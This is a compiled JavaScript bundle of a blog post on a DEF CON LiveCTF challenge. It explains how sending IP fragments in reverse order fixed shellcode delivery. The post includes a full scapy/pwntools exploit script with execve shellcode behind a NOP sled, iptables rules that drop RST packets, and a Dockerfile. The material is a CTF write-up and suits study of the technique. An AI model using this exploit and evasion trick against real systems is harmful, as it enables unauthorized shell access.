"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[7538],{10081:e=>{e.exports=JSON.parse('{"permalink":"/pages/blog/scapy-revfrag","source":"@site/blog/2023-09-15-noppenheimer.md","title":"One Weird Trick to fix your CTF Payloads","description":"Noppenheimer","date":"2023-09-15T00:00:00.000Z","tags":[{"inline":true,"label":"scapy","permalink":"/pages/blog/tags/scapy"},{"inline":true,"label":"fragmentation","permalink":"/pages/blog/tags/fragmentation"},{"inline":true,"label":"pwntools","permalink":"/pages/blog/tags/pwntools"},{"inline":true,"label":"tcpip","permalink":"/pages/blog/tags/tcpip"}],"readingTime":6.42,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"scapy-revfrag","title":"One Weird Trick to fix your CTF Payloads","authors":"ltsrad","tags":["scapy","fragmentation","pwntools","tcpip"]},"unlisted":false,"prevItem":{"title":"Attack Surface Reduction Research (Part 1)","permalink":"/pages/blog/barely-ap-surfaces"},"nextItem":{"title":"How to use the SPR 1-click install on DigitalOcean","permalink":"/pages/blog/virtual-spr-1click"}}')},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>o});var t=s(96540);const l={},a=t.createContext(l);function r(e){const n=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:r(e.components),t.createElement(a.Provider,{value:n},e.children)}},45583:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/noppenheimer-772f2f7deb2622bf2c0904c024b136ef.gif"},75739:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>f,frontMatter:()=>r,metadata:()=>t,toc:()=>d});var t=s(10081),l=s(74848),a=s(28453);const r={slug:"scapy-revfrag",title:"One Weird Trick to fix your CTF Payloads",authors:"ltsrad",tags:["scapy","fragmentation","pwntools","tcpip"]},o=void 0,i={authorsImageUrls:[void 0]},d=[{value:"Noppenheimer",id:"noppenheimer",level:2},{value:"What Went Wrong",id:"what-went-wrong",level:2},{value:"Solving with IP Fragmentation",id:"solving-with-ip-fragmentation",level:2}];function p(e){const n={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.h2,{id:"noppenheimer",children:"Noppenheimer"}),"\n",(0,l.jsxs)(n.p,{children:["At Defcon CTF Finals, the Final round of  ",(0,l.jsx)(n.a,{href:"https://livectf.com/",children:"LiveCTF"})," went into sudden death.\nThe challenge was named Noppenheimer, a play on the Oppenheimer film that was released, and NOP (NO-OP) instructions."]}),"\n",(0,l.jsx)(n.p,{children:'Contestants had to turn a random sequence of bytes into a gadget/shellcode cave by converting bytes into NOPs,\nby sending "nuke" Launch commands.'}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"Options:\nLAUNCH x,y - Launch a test at position x,y\nVIEW - See state of test site\nENDTEST - Conclude testing\n>\n"})}),"\n",(0,l.jsx)(n.p,{children:"Both teams solved locally.  But they couldn't exploit Noppenheimer against the remote system."}),"\n",(0,l.jsx)(n.h2,{id:"what-went-wrong",children:"What Went Wrong"}),"\n",(0,l.jsxs)(n.p,{children:["Teams used a single ",(0,l.jsx)(n.code,{children:"read/recv"})," syscall to receive to get shellcode to run. Without any delays in the program,\nthe call will return quickly and if the payload is larger than the MTU it will return partial TCP data.\nThe payloads were crashing on the remote end as they didn't have working shellcode."]}),"\n",(0,l.jsxs)(n.p,{children:["As @ZetaTwo and @psifertex ",(0,l.jsx)(n.a,{href:"https://youtu.be/VxDnpShqloA?t=16683",children:"explain"}),", the conditions which cause this are\nhighly specific to the exploit with payload length, delays, and other factors. The testers exploits didnt trigger this problem."]}),"\n",(0,l.jsx)(n.h2,{id:"solving-with-ip-fragmentation",children:"Solving with IP Fragmentation"}),"\n",(0,l.jsx)(n.p,{children:"IP Packets can be fragmented into multiple packets when they exceed the MTU size,\nwhich is the maximum amount of octets accepted at layer 2 on Ethernet."}),"\n",(0,l.jsx)(n.p,{children:"By sending fragments in reverse order, it can be ensured that the recv/read call will\nget all of the data that has been sent, even beyond the MTU size."}),"\n",(0,l.jsx)(n.p,{children:"Here is a python solution that combines scapy with pwntools, to run inside of a container, which does just that."}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:s(45583).A+"",width:"1200",height:"600"})}),"\n",(0,l.jsx)(n.p,{children:"As a bonus, it also includes a semi-working TCP implementation written in pure scapy/python."}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\n# -*- coding: UTF-8 -*-\n# Author: alex@supernetworks.org <github.com/lts-rad>\n\'\'\'\nDemo of TCP w/ sending fragmented payloads with scapy.\n\nRun this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,\nthis code will use iptables to block them.\n\n#> iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src_ip> -j DROP\n\'\'\'\nfrom scapy.all import *\nimport logging\nfrom pwn import *\n\nlogger = logging.getLogger(__name__)\n#logging.basicConfig(level=logging.DEBUG)\n#logger.setLevel(logging.DEBUG)\n\nclass TcpHandshake(object):\n\n    class RLoop(threading.Thread):\n        def __init__(self, tcp):\n            threading.Thread.__init__(self)\n            self.tcp = tcp\n\n        def handle_recv(self, pkt):\n            if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):\n                if pkt[TCP].flags & 0x3f == 0x12:   # SYN+ACK\n                    logger.debug("RCV: SYN+ACK")\n                    self.tcp.send_synack_ack(pkt)\n                    return\n                elif  pkt[TCP].flags & 4 != 0:      # RST\n                    logger.debug("RCV: RST")\n                    #raise Exception("RST")\n                    self.tcp.abort = True\n                    return\n                elif pkt[TCP].flags & 0x1 == 1:     # FIN\n                    logger.debug("RCV: FIN")\n                    self.tcp.send_finack(pkt)\n                    return\n                elif pkt[TCP].flags.A: # ACK came in?\n                    logger.debug("RCV: ACK")\n                    self.tcp.send_base = pkt[TCP].ack\n\n                    logger.debug("RCV: %s"%repr(pkt))\n                    if len(pkt[TCP].payload) > 0:\n                        self.tcp.Q += [bytes(pkt[TCP].payload)]\n                    self.tcp.send_ack(pkt)\n\n                    #great, got an ack, check the send queue for pending data\n                    while len(self.tcp.send_queue) > 0:\n                        ret = self.tcp.send_data(self.tcp.send_queue.pop(0))\n                        if ret == False:\n                            break\n\n                    return\n                else:\n                    logger.debug("? Unhandled packet")\n            return\n\n\n        def run(self):\n            ans = sniff(filter="tcp port %s"%self.tcp.target[1], lfilter=self.tcp.match_packet, prn=self.handle_recv, store=False)\n\n    def __init__(self, target, sport=31337):\n        self.seq = 0\n        self.seq_next = 0\n        self.target = target\n        self.dst = next(iter(Net(target[0])))\n        self.dport = target[1]\n        self.sport = sport #random.randrange(0, 2**16)\n        self.seq_start = random.randrange(0, 2**32)\n        # options=[(\'WScale\', 7)]\n        self.l4 = IP(version=4,dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,\n                                        seq=self.seq_start, window=65535)\n        self.src = self.l4.src\n        self.Q = []\n        self.abort = False\n\n\n        self.send_base = self.l4[TCP].seq\n        self.send_window = self.l4[TCP].window\n        self.last_sent = self.send_base\n        self.send_queue = []\n\n        self.last_ack  = 0\n\n        #let underlying handle ethernet\n        self.s = conf.L3socket()\n\n        self.R = self.RLoop(self)\n        self.R.start()\n        logger.debug("init: %s"%repr(target))\n\n    def start(self):\n        logger.debug("start")\n        return self.send_syn()\n\n    def match_packet(self, pkt):\n        if pkt.haslayer(IP) and pkt[IP].dst == self.l4[IP].src \\\n           and pkt.haslayer(TCP) and pkt[TCP].dport == self.sport:\n           if pkt[TCP].ack <= self.seq_next and pkt[TCP].ack >= self.seq_start:\n               return True\n           else:\n               logger.debug("ack was %d expected %d" % (pkt[TCP].ack, self.seq_next))\n        return False\n\n    def send_syn(self):\n        logger.debug("SND: SYN")\n        self.l4[TCP].flags = "S"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_synack_ack(self, pkt):\n        logger.debug("SND: SYN+ACK -> ACK with ack # %d" % (pkt[TCP].seq + 1))\n        self.l4[TCP].ack = pkt[TCP].seq + 1\n        self.l4[TCP].flags = "A"\n        self.seq_next = self.l4[TCP].seq\n        self.s.send(self.l4)\n\n    def send_data(self, d):\n        if self.abort == True:\n            print("[-] not sending data, aborted !!!")\n            return False\n        self.l4[TCP].flags = "PA"\n\n        available = self.send_base + self.send_window - self.last_sent\n\n        if available == 0:\n            self.send_queue += [d]\n            # have to wait\n            return False\n        assert available >= 0\n\n        if available < len(d):\n            d, chop = d[:available], d[available:]\n            self.send_queue += [chop]\n\n        self.seq_next = self.l4[TCP].seq + len(d)\n        self.last_sent = self.seq_next\n        tosend = self.l4/d\n\n        self.s.send(tosend)\n        self.l4[TCP].seq += len(d)\n        return True\n\n    def send_frag_data(self, d, sz):\n        if self.abort == True:\n            print("[-] not sending data, aborted !!!")\n            return\n        assert sz >= 8\n        self.l4[TCP].flags = "PA"\n\n        #tbd send window handling for fragments(?)\n        dat = self.l4/d\n        fragments = fragment(dat, sz)\n        for f in fragments[::-1]:\n            self.s.send(f)\n\n        self.seq_next = self.l4[TCP].seq + len(d)\n        self.last_sent = self.seq_next\n        self.l4[TCP].seq += len(d)\n        return True\n\n    def send_fin(self):\n        logger.debug("SND: FIN")\n        self.l4[TCP].flags = "F"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_rst(self):\n        logger.debug("SND: RST")\n        self.l4[TCP].flags = "R"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_finack(self, pkt):\n        logger.debug("SND: FIN+ACK")\n        self.l4[TCP].flags = "FA"\n        self.l4[TCP].ack = pkt[TCP].seq + 1\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n        #raise Exception("FIN+ACK")\n        self.abort = True\n\n    def send_ack(self, pkt):\n        self.l4[TCP].flags = "A"\n\n        self.last_ack = pkt[TCP].ack\n        to_acknowledge = len(pkt[TCP].payload)\n        #logger.debug("SND: ACK with ack # %d" % (pkt[TCP].seq + len(pkt[TCP].load)))\n\n        if to_acknowledge != 0:\n            self.l4[TCP].ack = pkt[TCP].seq + to_acknowledge\n            self.s.send(self.l4)\n\n    def recv(self, timeout):\n        elapsed = 0\n        while (timeout != 0) and (elapsed < timeout):\n            if len(self.Q) > 0:\n                retval = self.Q.pop(0)\n                return retval\n            time.sleep(0.01)\n            elapsed += 0.\n        #returning nothing\n        return ""\n\n    def clear_recv(self):\n        self.Q = []\n\n    def wait_all_acks(self, timeout=0):\n        elapsed = 0\n        delta = 0.1\n        while (timeout != 0) and (elapsed < timeout):\n            if self.last_ack == self.seq_next and len(self.send_queue) == 0:\n                return True\n            time.sleep(delta)\n            elapsed += delta\n        return False\n\n\n\nif __name__== \'__main__\':\n    sport = random.randint(40000, 60000)\n    os.system("iptables -F OUTPUT")\n    os.system("iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP"%sport)\n    conf.verb = 0\n\n    tcp_hs = TcpHandshake(("172.17.0.2", 31337), sport=sport)\n\n    r = tubes.sock.sock()\n    r.send = tcp_hs.send_data\n    r.recv = tcp_hs.recv\n    tcp_hs.start()\n\n    tosend = b""\n    def nuke(offset):\n        global tosend\n        # scapy send is slow. to speed it up,\n        # chunk the commands\n        if len(tosend) > 400:\n            r.send(tosend)\n            tosend = b""\n\n        tosend += b\'LAUNCH %d,%d\\n\'%(offset%0x10,offset//0x10)\n\n    def nukes(a, b):\n        for i in range(a, b):\n            nuke(i)\n\n\n    nukes(0, 0x40)\n    nukes(0x50, 0x58)\n    nukes(0x5b, 0x60)\n    nukes(0x70, 0xb0)\n    nukes(0xc0, 0xc3)\n\n    nukes(0xc6, 0xc7)\n    nukes(0xca, 0xd0)\n    nuke(0xdc)\n    nukes(0xe0, 0xec)\n    nukes(0xed, 0xf0)\n\n    nukes(0x108, 0x10c)\n    nukes(0x10d, 0x473)\n    nukes(0x495, 0xc17)\n    nuke(0)\n\n    if tosend:\n        r.send(tosend)\n\n    tosend = b\'ENDTEST\\n\'\n    r.send(tosend)\n\n    context.arch = \'amd64\'\n    sc = b\'\\x90\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\'\n\n    print("******** sending shellcode ***********")\n    d = b\'\\x90\' * (0xd00+200) + sc\n\n    tcp_hs.send_frag_data(d, 100)\n    #raw_input()\n\n    r.recvuntil(b\'ENDTEST\')\n\n    #raw_input("Ready?")\n    print("Waiting for data to come in...")\n    time.sleep(2)\n    tcp_hs.clear_recv()\n    print("[+] Good")\n\n    try:\n        r.interactive()\n    except:\n        print(\'aborted\')\n\n    print("over")\n    raw_input()\n    os.system("iptables -F OUTPUT")\n    tcp_hs.send_fin()\n    tcp_hs.send_rst()\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'FROM python:3.8-slim\n\n# Set the working directory\nWORKDIR /app\n\n# Install system dependencies\nRUN apt-get update && apt-get install -y libpcap-dev\n\n# Install Scapy using pip\nRUN pip install scapy pwntools\nRUN pip uninstall pyelftools -y\nRUN pip install pyelftools==0.29\n\nRUN apt-get install -y iptables net-tools\nRUN apt-get install -y tmux tcpdump iproute2\nCOPY connect.py .\n\nENTRYPOINT ["/app/connect.py"]\n'})})]})}function f(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(p,{...e})}):p(e)}}}]);